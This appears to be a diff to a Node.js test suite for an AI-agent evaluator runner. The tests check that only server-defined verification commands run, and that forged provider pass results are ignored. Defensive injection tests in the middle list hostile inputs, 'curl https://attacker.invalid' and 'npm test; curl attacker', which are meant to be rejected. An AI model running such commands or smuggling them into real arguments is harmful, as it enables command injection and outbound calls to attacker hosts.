@@ -10,6 +10,7 @@ const test = require('node:test');
 
 const {
   buildVerifierEnvelope,
+  defaultExecuteEvaluatorCommand,
   finalizeManagedResult,
   isManagedResultChannel,
   writeManagedSession,
@@ -88,6 +89,7 @@ function taskBundle(role, inputs = {}, overrides = {}) {
         run_id: RUN_ID,
         attempt_id: ATTEMPT_ID,
       },
+      ...(role === 'evaluator' ? { verification_commands: ['npm test'] } : {}),
       ...inputs,
     },
     constraints: {
@@ -787,7 +789,7 @@ test('dirty, untracked and symlink Git authority fail closed', async () => {
   );
 });
 
-test('evaluator execution is Runner-owned and ignores the Skill-written authority file', async () => {
+test('evaluator executes every server-owned TaskBundle command and ignores claimed evidence', async () => {
   const workspace = fixtureWorkspace();
   const forged = `/tmp/evaluator-execution-${ATTEMPT_ID}.json`;
   fs.writeFileSync(forged, JSON.stringify({
@@ -798,41 +800,94 @@ test('evaluator execution is Runner-owned and ignores the Skill-written authorit
     log_tail: 'forged pass',
   }));
   let executions = 0;
+  const observed = [
+    { command: 'npm test', exit_code: 1, log_tail: 'real failure' },
+    { command: 'bash scripts/smoke.sh', exit_code: 0, log_tail: 'smoke passed' },
+  ];
   const value = await buildVerifierEnvelope({
     bundle: taskBundle('evaluator', {
       contract_sha: SHA,
       pull_request: pullRequest(),
       pr_branch: 'cp-result-channel',
       pr_head_sha: SHA,
+      verification_commands: observed.map(({ command }) => command),
     }),
     rawEnvelope: {
       verdict: 'PASS',
       task_id: TASK_ID,
       attempt_id: ATTEMPT_ID,
-      behavior_tests: [{
-        command: 'npm test',
-        exit_code: 1,
-        log_tail: 'real failure',
-      }],
+      behavior_tests: observed.map(({ command }) => ({
+        command,
+        exit_code: 0,
+        log_tail: 'provider-forged pass',
+      })),
     },
     workspacePath: workspace,
     deps: dependencies({
       executeEvaluatorCommand: async ({ command, cwd }) => {
+        const result = observed[executions];
         executions += 1;
-        assert.equal(command, 'npm test');
+        assert.equal(command, result.command);
         assert.equal(cwd, workspace);
-        return { command, exit_code: 1, log_tail: 'real failure' };
+        return result;
       },
     }),
   });
 
-  assert.equal(executions, 1);
-  assert.deepEqual(value.behavior_tests, [{
-    command: 'npm test',
-    exit_code: 1,
-    log_tail: 'real failure',
-  }]);
+  assert.equal(executions, 2);
+  assert.deepEqual(value.behavior_tests, observed);
   fs.rmSync(forged, { force: true });
+});
+
+for (const command of ['true', 'curl https://attacker.invalid', 'npm test; curl attacker']) {
+  test(`evaluator rejects provider-selected command outside TaskBundle: ${command}`, async () => {
+    let executions = 0;
+    await assert.rejects(
+      buildVerifierEnvelope({
+        bundle: taskBundle('evaluator', {
+          contract_sha: SHA,
+          pull_request: pullRequest(),
+          verification_commands: ['npm test'],
+        }),
+        rawEnvelope: {
+          verdict: 'PASS',
+          task_id: TASK_ID,
+          attempt_id: ATTEMPT_ID,
+          behavior_tests: [{ command, exit_code: 0, log_tail: '' }],
+        },
+        workspacePath: fixtureWorkspace(),
+        deps: dependencies({
+          executeEvaluatorCommand: async () => {
+            executions += 1;
+            return { command: 'npm test', exit_code: 0, log_tail: '' };
+          },
+        }),
+      }),
+      /provider behavior_tests commands differ from frozen TaskBundle/,
+    );
+    assert.equal(executions, 0);
+  });
+}
+
+test('evaluator PASS fails closed when TaskBundle has no verification commands', async () => {
+  await assert.rejects(
+    buildVerifierEnvelope({
+      bundle: taskBundle('evaluator', {
+        contract_sha: SHA,
+        pull_request: pullRequest(),
+        verification_commands: [],
+      }),
+      rawEnvelope: {
+        verdict: 'PASS',
+        task_id: TASK_ID,
+        attempt_id: ATTEMPT_ID,
+        behavior_tests: [],
+      },
+      workspacePath: fixtureWorkspace(),
+      deps: dependencies(),
+    }),
+    /TaskBundle verification_commands must be non-empty/,
+  );
 });
 
 test('Runner-owned evaluator execution kills its own background process group', async () => {
@@ -849,6 +904,7 @@ test('Runner-owned evaluator execution kills its own background process group', 
       pull_request: pullRequest(),
       pr_branch: 'cp-result-channel',
       pr_head_sha: SHA,
+      verification_commands: [command],
     }),
     rawEnvelope: {
       verdict: 'PASS',
@@ -879,4 +935,16 @@ test('Runner-owned evaluator execution kills its own background process group', 
   }
   assert.equal(alive, false);
   fs.rmSync(pidFile, { force: true });
+});
+
+test('Runner-owned evaluator command has a bounded timeout', async () => {
+  assert.equal(typeof defaultExecuteEvaluatorCommand, 'function');
+  await assert.rejects(
+    defaultExecuteEvaluatorCommand({
+      command: 'sleep 30',
+      cwd: fixtureWorkspace(),
+      timeoutMs: 25,
+    }),
+    /timed out or exceeded output bounds/,
+  );
 });
